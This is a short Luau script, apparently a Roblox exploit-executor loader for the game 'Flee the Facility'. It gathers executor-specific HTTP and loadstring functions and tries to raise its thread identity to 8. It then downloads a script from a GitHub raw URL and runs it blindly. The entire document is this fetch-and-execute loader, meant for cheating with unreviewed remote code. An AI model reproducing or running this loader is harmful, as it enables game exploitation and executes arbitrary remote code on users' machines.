local ReqHttp = "https://github.com/Backlostunking/Open-Source/blob/main/Flee-the-Facility.luau?raw=true"
local request, ExecuteRawStringHttp, setidentity, getidentity, ugc = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request), (loadstring or load), (setidentity or setthreadidentity) or (setthreadcontext or set_thread_context), (getidentity or getthreadidentity) or (getthreadcontext or get_thread_context), game or Game
pcall(function() if getidentity() <= 5 then setidentity(8) end end)
if (ugc.HttpGet) then ExecuteRawStringHttp(ugc:HttpGet(ReqHttp))()
elseif (ugc.HttpGetAsync) then ExecuteRawStringHttp(ugc:HttpGetAsync(ReqHttp))()
elseif (request) then ExecuteRawStringHttp(request({Url=ReqHttp,Method="GET"}).Body)()
end
